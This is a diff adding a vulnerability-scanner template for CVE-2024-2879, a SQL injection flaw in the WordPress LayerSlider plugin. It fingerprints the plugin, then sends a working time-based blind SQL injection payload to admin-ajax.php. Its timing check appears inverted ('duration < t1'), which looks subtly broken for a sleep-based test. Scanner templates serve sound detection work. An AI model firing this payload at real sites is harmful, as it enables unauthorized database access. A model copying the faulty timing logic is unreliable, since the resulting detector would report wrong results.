@@ -1,0 +1,46 @@
+id: wordpress-layerslider-sqli
+info:
+  name: WordPress LayerSlider SQL Injection Vulnerability (CVE-2024-2879)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-2879
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/LayerSlider/assets/static/public/front.css HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".ls-clearfix:before"
+
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP({{t1}})))x)--+x) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>"
+    extractors:
+      - type: dsl
+        dsl:
+          - duration < t1
+          - duration < t2
